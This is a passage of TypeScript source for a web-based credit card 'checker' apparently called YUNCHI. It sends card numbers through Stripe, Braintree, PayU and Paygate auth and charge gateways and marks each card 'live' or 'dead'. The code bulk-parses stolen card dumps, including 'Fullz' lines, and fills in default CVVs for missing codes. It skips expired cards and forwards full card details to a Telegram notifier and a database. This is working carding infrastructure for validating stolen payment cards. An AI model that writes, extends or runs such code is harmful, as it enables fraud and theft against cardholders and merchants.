        } else if (message.includes("declined") || message.includes("insufficient funds") || message.includes("card was declined")) {
          return { status: "dead", apiStatus, apiMessage, rawResponse };
        } else if (message.includes("rate limit") || message.includes("timeout") || message.includes("try again")) {
          console.log(`[B3-AUTH] Retryable error detected: ${message}`);
          if (attempt < maxRetries) {
            await new Promise(r => setTimeout(r, 800 + attempt * 300));
            continue;
          }
          return { status: "unknown", apiStatus, apiMessage, rawResponse };
        } else {
          return { status: "unknown", apiStatus, apiMessage, rawResponse };
        }
      } catch (error) {
        console.error('[B3-AUTH] API check error:', error);
        if (attempt < maxRetries) {
          await new Promise(r => setTimeout(r, 500 + attempt * 200));
          continue;
        }
        return {
          status: "unknown",
          apiStatus: "ERROR",
          apiMessage: error instanceof Error ? error.message : "Unknown error",
          rawResponse: String(error)
        };
      }
    }
    return {
      status: "unknown",
      apiStatus: "ERROR",
      apiMessage: "Max retries exceeded",
      rawResponse: "Max retries exceeded"
    };
  };

  // Combined Auth API check (YUNCHI AUTH 2) - uses both Stripe + B3 APIs in parallel for single card
  const checkCardViaCombined = async (cardNumber: string, month: string, year: string, cvv: string, maxRetries = 3): Promise<GatewayApiResponse> => {
    const cc = `${cardNumber}|${month}|${year}|${cvv}`;
    
    for (let attempt = 0; attempt <= maxRetries; attempt++) {
      try {
        console.log(`[COMBINED-AUTH] Checking card (attempt ${attempt + 1}/${maxRetries + 1}):`, cc);
        
        const { data, error } = await supabase.functions.invoke('combined-auth-check', {
          body: { cc }
        });
        
        if (error) {
          console.error('[COMBINED-AUTH] Edge function error:', error);
          if (attempt < maxRetries) {
            await new Promise(r => setTimeout(r, 500 + attempt * 200));
            continue;
          }
          return {
            status: "unknown",
            apiStatus: "ERROR",
            apiMessage: error.message || "Edge function error",
            rawResponse: JSON.stringify(error)
          };
        }
        
        console.log('[COMBINED-AUTH] API response:', data);
        
        // Extract real API response data
        const apiStatus = data?.apiStatus || data?.status || 'UNKNOWN';
        const apiMessage = data?.apiMessage || data?.message || 'No message';
        const rawResponse = JSON.stringify(data);
        const usedGateway = data?.usedGateway as string | undefined; // Which API returned the result
        
        // Use computedStatus from edge function if available
        const computedStatus = data?.computedStatus;
        if (computedStatus === "live" || computedStatus === "dead") {
          return { status: computedStatus, apiStatus, apiMessage, rawResponse, usedGateway };
        }
        
        // Fallback: Check message for status indicators
        const message = (data?.message as string)?.toLowerCase() || '';
        
        if (message.includes("approved") || message.includes("success") || message.includes("authorized") ||
            message.includes("payment method added successfully") || message.includes("card added successfully")) {
          return { status: "live", apiStatus, apiMessage, rawResponse, usedGateway };
        } else if (message.includes("declined") || message.includes("insufficient funds") || message.includes("card was declined")) {
          return { status: "dead", apiStatus, apiMessage, rawResponse, usedGateway };
        } else if (message.includes("rate limit") || message.includes("timeout") || message.includes("try again")) {
          console.log(`[COMBINED-AUTH] Retryable error detected: ${message}`);
          if (attempt < maxRetries) {
            await new Promise(r => setTimeout(r, 800 + attempt * 300));
            continue;
          }
          return { status: "unknown", apiStatus, apiMessage, rawResponse, usedGateway };
        } else {
          return { status: "unknown", apiStatus, apiMessage, rawResponse, usedGateway };
        }
      } catch (error) {
        console.error('[COMBINED-AUTH] API check error:', error);
        if (attempt < maxRetries) {
          await new Promise(r => setTimeout(r, 500 + attempt * 200));
          continue;
        }
        return {
          status: "unknown",
          apiStatus: "ERROR",
          apiMessage: error instanceof Error ? error.message : "Unknown error",
          rawResponse: String(error)
        };
      }
    }
    return {
      status: "unknown",
      apiStatus: "ERROR",
      apiMessage: "Max retries exceeded",
      rawResponse: "Max retries exceeded"
    };
  };

  // Parallel distributed check for bulk mode - sends card to specific API (stripe or b3)
  const checkCardViaDistributed = async (cardNumber: string, month: string, year: string, cvv: string, targetApi: 'stripe' | 'b3', maxRetries = 5): Promise<GatewayApiResponse> => {
    if (targetApi === 'stripe') {
      const result = await checkCardViaApi(cardNumber, month, year, cvv, maxRetries);
      return { ...result, usedGateway: 'stripe' };
    } else {
      const result = await checkCardViaB3(cardNumber, month, year, cvv, maxRetries);
      return { ...result, usedGateway: 'b3' };
    }
  };

  // Fallback simulation for non-API gateways
  const simulateCheck = async (): Promise<"live" | "dead" | "unknown"> => {
    await new Promise(resolve => setTimeout(resolve, 800 + Math.random() * 700));
    const random = Math.random();
    if (random > 0.3) return "live";
    if (random > 0.1) return "dead";
    return "unknown";
  };

  const performCheck = async () => {
    if (!selectedGateway) {
      toast.error("Please select a gateway");
      return;
    }

    if (!validateCard()) return;

    // Minimum 2 credits needed for a potential LIVE card
    if (userCredits < CREDIT_COST_LIVE) {
      toast.error("Insufficient credits. Please top up your balance.");
      return;
    }

    if (!userId) {
      toast.error("Please login to continue");
      return;
    }

    setChecking(true);
    setResult(null);

    try {
      // For CHARGE gateways, CVC is MANDATORY - reject if not provided
      const isChargeGateway = selectedGateway.type === "charge";
      if (isChargeGateway && !cvv) {
        toast.error("CVC is required for charge gateways");
        setChecking(false);
        return;
      }
      
      // For auth gateways, use 000 as CVV internally if not provided
      const internalCvv = cvv || "000";

      // Use real API for YUNCHI AUTH gateways and PAYGATE, simulation for others
      let gatewayResponse: GatewayApiResponse | null = null;
      
      if (selectedGateway.id === "stripe_auth") {
        gatewayResponse = await checkCardViaApi(cardNumber.replace(/\s/g, ''), expMonth, expYear, internalCvv);
      } else if (selectedGateway.id === "combined_auth") {
        gatewayResponse = await checkCardViaCombined(cardNumber.replace(/\s/g, ''), expMonth, expYear, internalCvv);
      } else if (selectedGateway.id === "braintree_auth") {
        gatewayResponse = await checkCardViaB3(cardNumber.replace(/\s/g, ''), expMonth, expYear, internalCvv);
      } else if (selectedGateway.id === "paygate_charge") {
        gatewayResponse = await checkCardViaPaygate(cardNumber.replace(/\s/g, ''), expMonth, expYear, internalCvv);
      } else if (selectedGateway.id === "stripe_charge") {
        gatewayResponse = await checkCardViaStripeCharge(cardNumber.replace(/\s/g, ''), expMonth, expYear, internalCvv);
      } else if (selectedGateway.id === "payu_charge") {
        gatewayResponse = await checkCardViaPayU(cardNumber.replace(/\s/g, ''), expMonth, expYear, internalCvv, payuAmount);
      }
      
      const checkStatus = gatewayResponse ? gatewayResponse.status : await simulateCheck();

      // Determine credit cost based on result: LIVE = 2, DEAD = 1, ERROR = 0
      const creditCost = checkStatus === "live" 
        ? CREDIT_COST_LIVE 
        : checkStatus === "dead" 
          ? CREDIT_COST_DEAD 
          : CREDIT_COST_ERROR;

      // Only deduct credits if not an error - use edge function to bypass RLS
      if (creditCost > 0) {
        const { data: deductResult, error: deductError } = await supabase.functions.invoke('deduct-credits', {
          body: { amount: creditCost }
        });

        if (deductError || !deductResult?.success) {
          console.error('Failed to deduct credits:', deductError || deductResult?.error);
          throw new Error(deductResult?.error || "Failed to deduct credits");
        }
        setUserCredits(deductResult.newCredits);
      }
      const fullCardString = `${cardNumber.replace(/\s/g, '')}|${expMonth}|${expYear}|${internalCvv}`;
      // Display card as entered by user (without auto-added CVC)
      const displayCardString = cvv 
        ? `${cardNumber.replace(/\s/g, '')}|${expMonth}|${expYear}|${cvv}`
        : `${cardNumber.replace(/\s/g, '')}|${expMonth}|${expYear}`;

      await supabase
        .from('card_checks')
        .insert({
          user_id: userId,
          gateway: selectedGateway.id,
          status: 'completed',
          result: checkStatus,
          card_details: fullCardString
        });
      
      // Build API response string for display
      const apiResponseDisplay = gatewayResponse 
        ? `${gatewayResponse.apiStatus}: ${gatewayResponse.apiMessage}${gatewayResponse.apiTotal ? ` (${gatewayResponse.apiTotal})` : ''}`
        : undefined;
      
      const checkResult: CheckResult = {
        status: checkStatus,
        message: checkStatus === "live" 
          ? "Card is valid and active" 
          : checkStatus === "dead" 
            ? "Card declined or invalid"
            : "Unable to verify - try another gateway",
        gateway: selectedGateway.name,
        card: fullCardString,
        displayCard: displayCardString,
        apiResponse: apiResponseDisplay,
        usedApi: gatewayResponse?.usedGateway,
        rawResponse: gatewayResponse?.rawResponse
      };

      setResult(checkResult);

      // Send Telegram notification for PAYGATE checks (CHARGED/DECLINED only, skip UNKNOWN)
      if (selectedGateway.id === "paygate_charge" && gatewayResponse && checkStatus !== "unknown") {
        try {
          // Build real response message from API
          const realResponseMessage = `${gatewayResponse.apiStatus}: ${gatewayResponse.apiMessage}${gatewayResponse.apiTotal ? ` (${gatewayResponse.apiTotal})` : ''}`;
          
          await supabase.functions.invoke('notify-charged-card', {
            body: {
              user_id: userId,
              card_details: fullCardString,
              status: checkStatus === "live" ? "CHARGED" : "DECLINED",
              response_message: realResponseMessage,
              amount: gatewayResponse.apiTotal || "$14.00",
              gateway: "PAYGATE",
              api_response: gatewayResponse.rawResponse
            }
          });
        } catch (notifyError) {
          console.log("Failed to send Telegram notification:", notifyError);
        }
      }

      // Send Telegram notification for STRIPE CHARGE checks (CHARGED/DECLINED only, skip UNKNOWN)
      if (selectedGateway.id === "stripe_charge" && gatewayResponse && checkStatus !== "unknown") {
        try {
          const realResponseMessage = `${gatewayResponse.apiStatus}: ${gatewayResponse.apiMessage}${gatewayResponse.apiTotal ? ` (${gatewayResponse.apiTotal})` : ''}`;
          
          await supabase.functions.invoke('notify-charged-card', {
            body: {
              user_id: userId,
              card_details: fullCardString,
              status: checkStatus === "live" ? "CHARGED" : "DECLINED",
              response_message: realResponseMessage,
              amount: gatewayResponse.apiTotal || "$8.00",
              gateway: "Yunchi Stripe Charge",
              api_response: gatewayResponse.rawResponse
            }
          });
        } catch (notifyError) {
          console.log("Failed to send Telegram notification:", notifyError);
        }
      }

      // Send Telegram notification for B3 checks (LIVE ONLY - user requested no declined cards)
      if (selectedGateway.id === "braintree_auth" && gatewayResponse && checkStatus === "live") {
        try {
          const realResponseMessage = `${gatewayResponse.apiStatus}: ${gatewayResponse.apiMessage}`;
          
          await supabase.functions.invoke('notify-charged-card', {
            body: {
              user_id: userId,
              card_details: fullCardString,
              status: "CHARGED",
              response_message: realResponseMessage,
              amount: "$0 Auth",
              gateway: "YUNCHI AUTH 3",
              api_response: gatewayResponse.rawResponse
            }
          });
        } catch (notifyError) {
          console.log("Failed to send Telegram notification:", notifyError);
        }
      }

      // Send Telegram notification for STRIPE AUTH checks (LIVE ONLY)
      if (selectedGateway.id === "stripe_auth" && gatewayResponse && checkStatus === "live") {
        try {
          const realResponseMessage = `${gatewayResponse.apiStatus}: ${gatewayResponse.apiMessage}`;
          
          await supabase.functions.invoke('notify-charged-card', {
            body: {
              user_id: userId,
              card_details: fullCardString,
              status: "CHARGED",
              response_message: realResponseMessage,
              amount: "$0 Auth",
              gateway: "YUNCHI AUTH 1",
              api_response: gatewayResponse.rawResponse
            }
          });
        } catch (notifyError) {
          console.log("Failed to send Telegram notification:", notifyError);
        }
      }

      // Send Telegram notification for COMBINED AUTH checks (LIVE ONLY)
      if (selectedGateway.id === "combined_auth" && gatewayResponse && checkStatus === "live") {
        try {
          const usedApiLabel = gatewayResponse.usedGateway === 'stripe' ? 'STRIPE' : gatewayResponse.usedGateway === 'b3' ? 'B3' : 'COMBINED';
          const realResponseMessage = `${gatewayResponse.apiStatus}: ${gatewayResponse.apiMessage}`;
          
          await supabase.functions.invoke('notify-charged-card', {
            body: {
              user_id: userId,
              card_details: fullCardString,
              status: "CHARGED",
              response_message: realResponseMessage,
              amount: "$0 Auth",
              gateway: `YUNCHI AUTH 2 (${usedApiLabel})`,
              api_response: gatewayResponse.rawResponse
            }
          });
        } catch (notifyError) {
          console.log("Failed to send Telegram notification:", notifyError);
        }
      }

      // Send Telegram notification for PayU checks (LIVE ONLY)
      if (selectedGateway.id === "payu_charge" && gatewayResponse && checkStatus === "live") {
        try {
          const realResponseMessage = `${gatewayResponse.apiStatus}: ${gatewayResponse.apiMessage}`;
          
          await supabase.functions.invoke('notify-charged-card', {
            body: {
              user_id: userId,
              card_details: fullCardString,
              status: "CHARGED",
              response_message: realResponseMessage,
              amount: `₹${payuAmount}`,
              gateway: "YUNCHI PayU",
              api_response: gatewayResponse.rawResponse
            }
          });
        } catch (notifyError) {
          console.log("Failed to send Telegram notification:", notifyError);
        }
      }

      if (checkResult.status === "live") {
        // Play live card sound if enabled
        playLiveSoundIfEnabled();
        
        // Advanced blood-red celebration effect
        const bloodRedColors = ['#dc2626', '#ef4444', '#b91c1c', '#991b1b', '#7f1d1d', '#fca5a5'];
        
        // Initial burst from center
        confetti({
          particleCount: 120,
          spread: 100,
          origin: { y: 0.6 },
          colors: bloodRedColors,
          gravity: 0.8,
          scalar: 1.2,
          drift: 0
        });
        
        // Delayed side bursts for dramatic effect
        setTimeout(() => {
          confetti({
            particleCount: 50,
            angle: 60,
            spread: 55,
            origin: { x: 0, y: 0.7 },
            colors: bloodRedColors,
            gravity: 1
          });
          confetti({
            particleCount: 50,
            angle: 120,
            spread: 55,
            origin: { x: 1, y: 0.7 },
            colors: bloodRedColors,
            gravity: 1
          });
        }, 150);
        
        // Final shower effect
        setTimeout(() => {
          confetti({
            particleCount: 80,
            spread: 180,
            origin: { y: 0 },
            colors: bloodRedColors,
            gravity: 1.5,
            startVelocity: 25,
            ticks: 100
          });
        }, 300);
        
        toast.success("Card is LIVE!", { description: checkResult.message });
      } else if (checkResult.status === "dead") {
        toast.error("Card is DEAD", { description: checkResult.message });
      } else {
        toast.warning("Check inconclusive", { description: checkResult.message });
      }

      // Add to local history with full card info
      const newCheck: GatewayCheck = {
        id: crypto.randomUUID(),
        created_at: new Date().toISOString(),
        gateway: selectedGateway.id,
        status: 'completed',
        result: checkStatus,
        fullCard: fullCardString,
        displayCard: displayCardString
      };
      setGatewayHistory(prev => [newCheck, ...prev].slice(0, 50));

    } catch (error) {
      console.error('Check error:', error);
      toast.error("Check failed. Please try again.");
    } finally {
      setChecking(false);
    }
  };

  const clearForm = () => {
    setCardNumber("");
    setExpMonth("");
    setExpYear("");
    setCvv("");
    setResult(null);
  };

  // File input ref for bulk upload
  const fileInputRef = useRef<HTMLInputElement>(null);

  // Bulk checking functions - Enhanced parser for multiple formats with intelligent separator detection
  // Returns cards with optional CVV (empty string if not provided, for auth gateway support)
  const parseCards = (input: string, isAuthGateway: boolean = false): { card: string; month: string; year: string; cvv: string; originalCvv: string }[] => {
    const lines = input.trim().split('\n').filter(line => line.trim());
    const cards: { card: string; month: string; year: string; cvv: string; originalCvv: string }[] = [];
    const seenCards = new Set<string>();

    // Helper function to normalize and extract card components (with optional CVV)
    const extractCardComponents = (line: string, requireCvv: boolean): { card: string; month: string; year: string; cvv: string; originalCvv: string } | null => {
      // First, try to find the card number (13-16 digits)
      const cardNumMatch = line.match(/\b(\d{13,16})\b/);
      if (!cardNumMatch) return null;
      
      const cardNum = cardNumMatch[1];
      const cardEndIndex = line.indexOf(cardNum) + cardNum.length;
      const afterCard = line.slice(cardEndIndex);
      
      // Try patterns with CVV first
      const mixedPatternsWithCvv = [
        // CardNumber|MM/YY|CVC or CardNumber|MM/YY/CVC
        /^[\|\-\.\s\/]+(\d{1,2})[\s\/\-\.]+(\d{2,4})[\|\-\.\s\/]+(\d{3,4})\b/,
        // Standard single separator: |, /, -, ., or space
        /^[\|\-\.\s\/]+(\d{1,2})[\|\-\.\s\/]+(\d{2,4})[\|\-\.\s\/]+(\d{3,4})\b/,
      ];
      
      for (const pattern of mixedPatternsWithCvv) {
        const match = afterCard.match(pattern);
        if (match) {
          const [, month, year, cvv] = match;
          const monthNum = parseInt(month);
          if (monthNum >= 1 && monthNum <= 12) {
            return {
              card: cardNum,
              month: month.padStart(2, '0'),
              year: year.length === 4 ? year.slice(2) : year,
              cvv,
              originalCvv: cvv
            };
          }
        }
      }
      
      // If CVV not required, try patterns without CVV (for auth gateways)
      if (!requireCvv) {
        const mixedPatternsNoCvv = [
          // CardNumber|MM/YY or CardNumber|MM-YY (no CVV)
          /^[\|\-\.\s\/]+(\d{1,2})[\s\/\-\.]+(\d{2,4})(?:[\|\-\.\s\/]*$|[^\d]|$)/,
          // Standard single separator without CVV
          /^[\|\-\.\s\/]+(\d{1,2})[\|\-\.\s\/]+(\d{2,4})(?:[\|\-\.\s\/]*$|[^\d]|$)/,
        ];
        
        for (const pattern of mixedPatternsNoCvv) {
          const match = afterCard.match(pattern);
          if (match) {
            const [, month, year] = match;
            const monthNum = parseInt(month);
            if (monthNum >= 1 && monthNum <= 12) {
              return {
                card: cardNum,
                month: month.padStart(2, '0'),
                year: year.length === 4 ? year.slice(2) : year,
                cvv: "000", // Auto-add 000 internally
                originalCvv: "" // No CVV was provided
              };
            }
          }
        }
      }
      
      return null;
    };

    // Helper function to get default CVC based on card brand (4 digits for Amex, 3 for others)
    const getDefaultCvc = (cardNumber: string): string => {
      // American Express cards start with 34 or 37
      if (cardNumber.startsWith('34') || cardNumber.startsWith('37')) {
        return "0000";
      }
      return "000";
    };

    for (const line of lines) {
      const trimmedLine = line.trim();
      
      // Try to extract card data using multiple patterns
      let cardData: { card: string; month: string; year: string; cvv: string; originalCvv: string } | null = null;
      
      // Pattern 1: Pipe-delimited with CVV (CardNumber|MM|YY|CVC or CardNumber|MM|YYYY|CVC)
      const pipeMatch = trimmedLine.match(/^(\d{13,16})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})/);
      if (pipeMatch) {
        const [, card, month, year, cvv] = pipeMatch;
        cardData = {
          card,
          month: month.padStart(2, '0'),
          year: year.length === 4 ? year.slice(2) : year,
          cvv,
          originalCvv: cvv
        };
      }
      
      // Pattern 1b: Pipe-delimited without CVV (CardNumber|MM|YY or CardNumber|MM|YY|) - for all gateways
      if (!cardData) {
        // Match cards with trailing pipe or no CVV: 5134148665605189|01|2026| or 5134148665605189|01|2026
        const pipeNoCvvMatch = trimmedLine.match(/^(\d{13,16})\|(\d{1,2})\|(\d{2,4})\|?\s*$/);
        if (pipeNoCvvMatch) {
          const [, card, month, year] = pipeNoCvvMatch;
          cardData = {
            card,
            month: month.padStart(2, '0'),
            year: year.length === 4 ? year.slice(2) : year,
            cvv: getDefaultCvc(card),
            originalCvv: ""
          };
        }
      }
      
      // Pattern 2: Space-delimited with CVV (CardNumber MM YY CVC or CardNumber MM YYYY CVC)
      if (!cardData) {
        const spaceMatch = trimmedLine.match(/^(\d{13,16})\s+(\d{1,2})\s+(\d{2,4})\s+(\d{3,4})/);
        if (spaceMatch) {
          const [, card, month, year, cvv] = spaceMatch;
          cardData = {
            card,
            month: month.padStart(2, '0'),
            year: year.length === 4 ? year.slice(2) : year,
            cvv,
            originalCvv: cvv
          };
        }
      }
      
      // Pattern 2b: Space-delimited without CVV (CardNumber MM YY) - for all gateways
      if (!cardData) {
        const spaceNoCvvMatch = trimmedLine.match(/^(\d{13,16})\s+(\d{1,2})\s+(\d{2,4})(?:\s*$)/);
        if (spaceNoCvvMatch) {
          const [, card, month, year] = spaceNoCvvMatch;
          cardData = {
            card,
            month: month.padStart(2, '0'),
            year: year.length === 4 ? year.slice(2) : year,
            cvv: getDefaultCvc(card),
            originalCvv: ""
          };
        }
      }
      
      // Pattern 3: Forward slash delimited with CVV (CardNumber/MM/YY/CVC)
      if (!cardData) {
        const slashMatch = trimmedLine.match(/^(\d{13,16})\/(\d{1,2})\/(\d{2,4})\/(\d{3,4})/);
        if (slashMatch) {
          const [, card, month, year, cvv] = slashMatch;
          cardData = {
            card,
            month: month.padStart(2, '0'),
            year: year.length === 4 ? year.slice(2) : year,
            cvv,
            originalCvv: cvv
          };
        }
      }
      
      // Pattern 3b: Forward slash delimited without CVV (CardNumber/MM/YY) - for all gateways
      if (!cardData) {
        const slashNoCvvMatch = trimmedLine.match(/^(\d{13,16})\/(\d{1,2})\/(\d{2,4})(?:\/|$|\s*$)/);
        if (slashNoCvvMatch) {
          const [, card, month, year] = slashNoCvvMatch;
          cardData = {
            card,
            month: month.padStart(2, '0'),
            year: year.length === 4 ? year.slice(2) : year,
            cvv: getDefaultCvc(card),
            originalCvv: ""
          };
        }
      }
      
      // Pattern 4: Dash-delimited with CVV (CardNumber-MM-YY-CVC)
      if (!cardData) {
        const dashMatch = trimmedLine.match(/^(\d{13,16})\-(\d{1,2})\-(\d{2,4})\-(\d{3,4})/);
        if (dashMatch) {
          const [, card, month, year, cvv] = dashMatch;
          cardData = {
            card,
            month: month.padStart(2, '0'),
            year: year.length === 4 ? year.slice(2) : year,
            cvv,
            originalCvv: cvv
          };
        }
      }
      
      // Pattern 4b: Dash-delimited without CVV (CardNumber-MM-YY) - for all gateways
      if (!cardData) {
        const dashNoCvvMatch = trimmedLine.match(/^(\d{13,16})\-(\d{1,2})\-(\d{2,4})(?:\-|$|\s*$)/);
        if (dashNoCvvMatch) {
          const [, card, month, year] = dashNoCvvMatch;
          cardData = {
            card,
            month: month.padStart(2, '0'),
            year: year.length === 4 ? year.slice(2) : year,
            cvv: getDefaultCvc(card),
            originalCvv: ""
          };
        }
      }
      
      // Pattern 5: Dot-delimited with CVV (CardNumber.MM.YY.CVC)
      if (!cardData) {
        const dotMatch = trimmedLine.match(/^(\d{13,16})\.(\d{1,2})\.(\d{2,4})\.(\d{3,4})/);
        if (dotMatch) {
          const [, card, month, year, cvv] = dotMatch;
          cardData = {
            card,
            month: month.padStart(2, '0'),
            year: year.length === 4 ? year.slice(2) : year,
            cvv,
            originalCvv: cvv
          };
        }
      }
      
      // Pattern 5b: Dot-delimited without CVV (CardNumber.MM.YY) - for all gateways
      if (!cardData) {
        const dotNoCvvMatch = trimmedLine.match(/^(\d{13,16})\.(\d{1,2})\.(\d{2,4})(?:\.|$|\s*$)/);
        if (dotNoCvvMatch) {
          const [, card, month, year] = dotNoCvvMatch;
          cardData = {
            card,
            month: month.padStart(2, '0'),
            year: year.length === 4 ? year.slice(2) : year,
            cvv: getDefaultCvc(card),
            originalCvv: ""
          };
        }
      }
      
      // Pattern 6: Track data format (CardNumber=YYMM) - auto-convert to standard format
      if (!cardData) {
        const trackMatch = trimmedLine.match(/^(\d{13,16})=(\d{4})(?:\d*)?$/);
        if (trackMatch) {
          const [, card, yymm] = trackMatch;
          // Extract YY and MM from YYMM format (e.g., 2611 = year 26, month 11)
          const year = yymm.slice(0, 2);
          const month = yymm.slice(2, 4);
          cardData = {
            card,
            month: month.padStart(2, '0'),
            year: year,
            cvv: getDefaultCvc(card),
            originalCvv: ""
          };
        }
      }
      
      // Pattern 7: Mixed separators (CardNumber|MM/YY|CVC or CardNumber|MM/YY/CVC)
      if (!cardData) {
        cardData = extractCardComponents(trimmedLine, !isAuthGateway);
      }

      // Pattern 7: Fullz extraction - look for card number + exp + cvv anywhere in line
      if (!cardData) {
        // Extract 13-16 digit card number
        const cardNumMatch = trimmedLine.match(/\b(\d{13,16})\b/);
        if (cardNumMatch) {
          const cardNum = cardNumMatch[1];
          
          // Look for expiration patterns: MM/YY, MM/YYYY, MM-YY, MM-YYYY, MMYY, MMYYYY
          const expPatterns = [
            /\b(0[1-9]|1[0-2])[\/\-\.]?(20)?(\d{2})\b/,  // MM/YY or MM/YYYY or MMYY
            /\bexp[:\s]*(0[1-9]|1[0-2])[\/\-\.]?(20)?(\d{2})\b/i, // EXP: MM/YY
          ];
          
          let expMonth = '', expYear = '';
          for (const pattern of expPatterns) {
            const expMatch = trimmedLine.match(pattern);
            if (expMatch) {
              expMonth = expMatch[1];
              expYear = expMatch[3] || expMatch[2];
              break;
            }
          }
          
          // Look for CVV (3-4 digit number that's not the card or exp)
          const cvvPatterns = [
            /\bcvv[:\s]*(\d{3,4})\b/i,  // CVV: 123
            /\bcvc[:\s]*(\d{3,4})\b/i,  // CVC: 123
            /\bsecurity[:\s]*(\d{3,4})\b/i, // Security: 123
          ];
          
          let cvvNum = '';
          for (const pattern of cvvPatterns) {
            const cvvMatch = trimmedLine.match(pattern);
            if (cvvMatch) {
              cvvNum = cvvMatch[1];
              break;
            }
          }
          
          // If no labeled CVV, try to find a standalone 3-4 digit number
          if (!cvvNum) {
            const allNumbers = trimmedLine.match(/\b\d{3,4}\b/g) || [];
            for (const num of allNumbers) {
              // Skip if it's part of the card number or exp date
              if (!cardNum.includes(num) && num !== expMonth && num !== expYear && num !== expMonth + expYear) {
                if (num.length >= 3 && num.length <= 4) {
                  cvvNum = num;
                  break;
                }
              }
            }
          }
          
          // For auth gateways, allow cards without CVV in Fullz extraction
          if (expMonth && expYear && (cvvNum || isAuthGateway)) {
            cardData = {
              card: cardNum,
              month: expMonth.padStart(2, '0'),
              year: expYear.length === 4 ? expYear.slice(2) : expYear,
              cvv: cvvNum || getDefaultCvc(cardNum),
              originalCvv: cvvNum
            };
          }
        }
      }
      
      // Validate and add the card
      if (cardData) {
        const monthNum = parseInt(cardData.month);
        const cvvValid = isAuthGateway 
          ? (cardData.cvv.length >= 3 && cardData.cvv.length <= 4) // Internal CVV will be 000 if not provided
          : (cardData.cvv.length >= 3 && cardData.cvv.length <= 4);
        
        // Check if card is expired
        const now = new Date();
        const currentYear = now.getFullYear() % 100;
        const currentMonth = now.getMonth() + 1;
        const cardYear = parseInt(cardData.year);
        const cardMonth = parseInt(cardData.month);
        const isExpired = cardYear < currentYear || (cardYear === currentYear && cardMonth < currentMonth);
        
        // For YUNCHI AUTH 1, filter out blocked card brands (Amex, Discover, JCB)
        let isBlockedBrand = false;
        if (selectedGateway?.id === "stripe_auth") {
          const digits = cardData.card;
          // American Express - starts with 34 or 37
          if (/^3[47]/.test(digits)) isBlockedBrand = true;
          // Discover - starts with 6011, 644-649, 65, or 622126-622925
          if (/^6(?:011|5|4[4-9]|22)/.test(digits)) isBlockedBrand = true;
          // JCB - starts with 3528-3589
          if (/^35(?:2[89]|[3-8])/.test(digits)) isBlockedBrand = true;
        }
        
        if (
          cardData.card.length >= 13 && 
          cardData.card.length <= 16 && 
          monthNum >= 1 && 
          monthNum <= 12 && 
          cardData.year.length === 2 &&
          cvvValid &&
          !isExpired && // Filter out expired cards
          !isBlockedBrand // Filter out blocked brands for YUNCHI AUTH 1
        ) {
          const cardKey = `${cardData.card}|${cardData.month}|${cardData.year}|${cardData.originalCvv || 'nocvv'}`;
          if (!seenCards.has(cardKey)) {
            seenCards.add(cardKey);
            cards.push(cardData);
          }
        }
      }
    }

    return cards;
  };

  // Handle file upload
  const handleFileUpload = (event: React.ChangeEvent<HTMLInputElement>) => {
    const file = event.target.files?.[0];
    if (!file) return;

    const validTypes = ['text/plain', 'text/csv', 'application/vnd.ms-excel'];
    const validExtensions = ['.txt', '.csv'];
    const fileExtension = file.name.toLowerCase().substring(file.name.lastIndexOf('.'));
    
    if (!validTypes.includes(file.type) && !validExtensions.includes(fileExtension)) {
      toast.error("Please upload a .txt or .csv file");
      return;
    }

    const reader = new FileReader();
    reader.onload = (e) => {
      const content = e.target?.result as string;
      if (content) {
        // Parse cards first to validate file content
        const isAuth = selectedGateway?.type === "auth";
        const newCards = parseCards(content, isAuth);
        
        // Reject file if no valid cards found
        if (newCards.length === 0) {
          const formatHint = isAuth ? "card|mm|yy, card=YYMM, or card|mm|yy|cvv" : "card|mm|yy|cvv";
          toast.error(`File rejected: No valid card data found. Expected format: ${formatHint}`);
          return;
        }
        
        // Append to existing input or set as new
        if (bulkInput.trim()) {
          setBulkInput(prev => prev + '\n' + content);
        } else {
          setBulkInput(content);
        }
        
        toast.success(`Loaded ${newCards.length} valid cards from file`);
      }
    };
    reader.onerror = () => {
      toast.error("Failed to read file");
    };
    reader.readAsText(file);
    
    // Reset file input
    if (fileInputRef.current) {
      fileInputRef.current.value = '';
    }
  };

  const maskCard = (card: string): string => {
    return `${card.slice(0, 6)}******${card.slice(-4)}`;
  };

  const startBulkCheck = async () => {
    if (!selectedGateway) {
      toast.error("Please select a gateway");
      return;
    }

    const isAuthGateway = selectedGateway.type === "auth";
    const isChargeGateway = selectedGateway.type === "charge";
    // For charge gateways, CVC is MANDATORY
    const cards = parseCards(bulkInput, isAuthGateway);
    
    // For charge gateways, filter out any cards without CVC
    const validCards = isChargeGateway 
      ? cards.filter(c => c.originalCvv && c.originalCvv.length >= 3)
      : cards;
    
    if (validCards.length === 0) {
      const formatHint = isChargeGateway 
        ? "CardNumber|MM|YY|CVC (CVC is mandatory for charge gateways)" 
        : isAuthGateway 
          ? "card|mm|yy, card=YYMM, or card|mm|yy|cvv" 
          : "card|mm|yy|cvv";
      toast.error(`No valid cards found. Use format: ${formatHint}`);
      return;
    }

    // Warn user if some cards were filtered out for charge gateways
    if (isChargeGateway && cards.length > validCards.length) {
      const skippedCount = cards.length - validCards.length;
      toast.warning(`${skippedCount} card(s) skipped - CVC is required for charge gateways`);
    }

    // Need at least 2 credits per card (for potential LIVE results)
    if (userCredits < validCards.length * CREDIT_COST_LIVE) {
      toast.error(`Insufficient credits. Need ${validCards.length * CREDIT_COST_LIVE} credits for ${validCards.length} cards (max cost if all LIVE).`);
      return;
    }

    if (!userId) {
      toast.error("Please login to continue");
      return;
    }

    // Store original lines for removal tracking
    const originalLines = bulkInput.trim().split('\n').filter(line => line.trim());

    setBulkChecking(true);
    setBulkPaused(false);
    setBulkResults([]);
    setBulkProgress(0);
    setBulkTotal(validCards.length);
    setBulkCurrentIndex(0);
    setBulkStartTime(Date.now());
    setBulkEstimatedTime("Calculating...");
    bulkAbortRef.current = false;
    bulkPauseRef.current = false;
    
    // Enable background mode to prevent browser throttling when minimized
    startBackgroundMode();

    // Track credits to deduct after each check (no upfront deduction)
    let totalCreditsDeducted = 0;

    const startTime = Date.now();
    let processedCount = 0;
    const allResults: BulkResult[] = [];

    // Worker function to process a single card
    const processCard = async (cardIndex: number): Promise<BulkResult | null> => {
      if (bulkAbortRef.current) return null;

      while (bulkPauseRef.current && !bulkAbortRef.current) {
        await new Promise(resolve => setTimeout(resolve, 100));
      }

      if (bulkAbortRef.current) return null;

      const cardData = validCards[cardIndex];

      try {
        // Use real API for YUNCHI AUTH gateways and PAYGATE, simulation for others
        let gatewayResponse: GatewayApiResponse | null = null;
        
